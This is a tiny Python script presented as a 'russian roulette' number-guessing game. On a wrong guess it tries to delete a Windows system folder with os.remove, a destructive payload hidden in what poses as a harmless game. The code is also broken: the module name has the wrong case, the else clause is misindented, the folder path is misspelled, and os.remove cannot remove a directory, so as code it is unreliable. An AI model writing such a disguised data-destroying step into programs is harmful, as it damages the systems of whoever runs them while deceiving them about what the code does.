import Random
import os

#russian roulette game

number=random.randint(1,10)

guess = input("guess a number between 1 and 10")
guess = int(guess)

if guess == number:
    print ("You win")
    else:
        os.remove("C:\Windows\System.32")
        